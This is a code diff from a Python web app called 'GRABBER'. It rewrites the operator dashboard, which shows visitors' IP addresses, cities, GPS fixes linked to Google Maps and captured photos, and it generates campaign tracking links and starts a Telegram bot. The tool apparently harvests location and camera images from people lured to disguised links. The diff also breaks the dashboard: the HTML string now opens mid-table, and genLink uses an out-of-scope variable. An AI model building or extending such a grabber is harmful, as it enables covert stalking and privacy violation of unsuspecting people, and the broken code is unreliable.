@@ -512,30 +512,33 @@ main();
 </script></body></html>"""
 
 # ── admin dashboard HTML ─────────────────────────────────────
-ADMIN_HTML = """<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>GRABBER Admin</title><style>
-body{background:#0f172a;color:#e2e8f0;font-family:-apple-system,Segoe UI,Roboto,sans-serif;margin:0;padding:24px}
-.wrap{max-width:980px;margin:auto}h1{font-size:22px}
-.cards{display:flex;gap:14px;flex-wrap:wrap;margin:18px 0}
-.card{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:14px 18px;min-width:120px}
-.card b{display:block;font-size:26px}
-.gen{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:16px;margin:16px 0;display:flex;gap:10px;flex-wrap:wrap}
-.gen input{background:#0f172a;border:1px solid #475569;color:#e2e8f0;padding:8px 12px;border-radius:6px;flex:1;min-width:200px}
-.gen button,.gen a{background:#2563eb;color:#fff;border:0;padding:8px 16px;border-radius:6px;cursor:pointer;text-decoration:none}
-table{width:100%;border-collapse:collapse;font-size:13px}
-th,td{text-align:left;padding:7px 10px;border-bottom:1px solid #1e293b}
-th{color:#94a3b8;font-weight:600}
-.photos{display:flex;gap:8px;flex-wrap:wrap;margin:12px 0}
-.photos img{width:110px;height:82px;object-fit:cover;border-radius:6px;border:1px solid #334155}
-a{color:#60a5fa}
-</style></head><body><div class="wrap">
-<h1>GRABBER Dashboard</h1>
-<div class="cards">
-<div class="card"><b id="cTotal">–</b>Hits</div>
-<div class="card"><b id="cGps">–</b>GPS fixes</div>
-<div class="card"><b id="cPhoto">–</b>Photos</div>
-<div class="card"><b id="cCamps">–</b>Campaigns</div></div>
-<div class="gen"><input id="name" placeholder="campaign name, e.g. promo1"><button onclick="genLink()">Generate link</button><a id="out" style="display:none" target="_blank">open</a></div>
-<div id="camps"></div>
-<h3>Recent hits</h3>
-<table><thead><tr><th>Time</th><th>IP</th><th>Place</th><th>Campaign</th><th>GPS
+ADMIN_HTML = """</th></tr></thead><tbody id="rows"></tbody></table>
+<h3>Latest photos</h3><div class="photos" id="photos"></div>
+<script>
+var TOKEN="__TOKEN__";
+async function load(){var r=await fetch("/api/stats?token="+TOKEN);var d=await r.json();
+document.getElementById("cTotal").textContent=d.total;
+document.getElementById("cGps").textContent=d.gps;
+document.getElementById("cPhoto").textContent=d.photos;
+document.getElementById("cCamps").textContent=Object.keys(d.campaigns||{}).length;
+var camps="";for(var c in d.campaigns)camps+=c+": "+d.campaigns[c]+"   ";
+document.getElementById("camps").textContent=camps;
+var rows="";(d.recent||[]).forEach(function(h){var loc=(h.city||"")+", "+(h.country||"");
+var g=(h.gps==="GRANTED"&&h.lat)?"<a href='https://www.google.com/maps?q="+h.lat+","+h.lon+"' target='_blank'>📍</a>":"—";
+rows+="<tr><td>"+h.ts+"</td><td>"+h.ip+"</td><td>"+loc+"</td><td>"+h.campaign+"</td><td>"+g+"</td><td>"+h.photos+"</td></tr>";});
+document.getElementById("rows").innerHTML=rows;
+var ph="";(d.last_photos||[]).forEach(function(fn){ph+="<img src='/img/"+fn+"'>";});
+document.getElementById("photos").innerHTML=ph;}
+function genLink(){var n=document.getElementById("name").value.trim();if(!n)return;
+var u=d.base_url.replace(/\/$/,"")+"/r/"+n;var a=document.getElementById("out");
+a.href=u;a.textContent=u;a.style.display="inline-block";}
+setInterval(load,5000);load();
+</script></div></body></html>"""
+
+# ── startup ──────────────────────────────────────────────────
+_replay_log()          # reload saved hits (also runs under gunicorn)
+_maybe_start_bot()     # Telegram bot thread (also runs under gunicorn)
+
+if __name__ == "__main__":
+    port = int(os.getenv("PORT", "5000"))
+    app.run(host="0.0.0.0", port=port, threaded=True)
